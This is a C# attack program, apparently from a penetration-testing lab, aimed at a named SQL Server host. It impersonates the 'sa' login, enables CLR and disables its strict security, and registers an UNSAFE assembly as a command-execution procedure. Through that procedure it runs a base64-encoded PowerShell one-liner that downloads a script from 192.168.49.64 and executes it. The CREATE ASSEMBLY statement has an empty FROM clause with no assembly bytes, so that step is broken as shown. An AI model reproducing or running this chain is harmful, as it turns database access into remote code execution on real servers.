using System;
using System.Data.SqlClient;

namespace custom_sql_exe
{
    class Program
    {
        static void Main(string[] args)
        {
            String server = "cdc01.prod.corp1.com";
            String database = "master";

            String conString = "Server = " + server + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth Sucess");
            }
            catch
            {
                Console.WriteLine("Auth Failed");
                Environment.Exit(0);
            }

            String query = "EXECUTE AS LOGIN = 'sa'; use msdb; EXEC sp_configure 'show advanced options',1;RECONFIGURE; EXEC sp_configure 'clr enabled',1;RECONFIGURE; EXEC sp_configure 'clr strict security',0;RECONFIGURE;";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            query = "CREATE ASSEMBLY myassembly FROM  PERMISSION_SET = UNSAFE;";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Close();

            query = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[custom_exec].[cmdExec];";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Close();

            query = "EXEC cmdExec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADYANAAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==';";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
